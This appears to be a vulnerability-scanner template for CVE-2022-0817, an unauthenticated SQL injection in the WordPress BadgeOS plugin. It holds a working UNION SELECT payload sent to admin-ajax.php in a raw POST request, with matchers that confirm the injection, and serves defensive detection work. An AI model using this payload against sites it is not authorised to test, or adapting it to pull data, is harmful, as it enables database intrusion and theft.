id: CVE-2022-0817
info:
  name: WordPress BadgeOS <=3.7.0 - SQL Injection
  author: theamanrawat
  severity: critical
  description: The WordPress BadgeOS plugin through version 3.7.0 is vulnerable to
    SQL injection, allowing attackers to gain access to sensitive information, modify
    data, and execute unauthorized administrative operations within the affected website's
    context.
  reference:
  - https://wpscan.com/vulnerability/69263610-f454-4f27-80af-be523d25659e
  - https://wordpress.org/plugins/badgeos/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0817
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0817
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The discovered SQL injection vulnerability in the WordPress BadgeOS plugin
      has the potential to enable unauthorized access to sensitive information and
      the execution of unauthorized administrative operations.
    recommendation: It is recommended to update WordPress BadgeOS plugin to version
      3.8.1 or above to mitigate the SQL injection vulnerability.
  tags: cve2022,wp,unauth,sqli,cve,wp-plugin,badgeos,wpscan,wordpress
variables:
  num: '999999999'
requests:
- raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=get-achievements&total_only=true&user_id=11 UNION ALL SELECT NULL,CONCAT(1,md5({{num}}),1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
    -

    '
  matchers:
  - type: dsl
    dsl:
    - status_code == 200
    - contains(body, md5(num))
    - contains(content_type, "application/json")
    - contains(body, "badgeos-arrange-buttons")
    condition: and
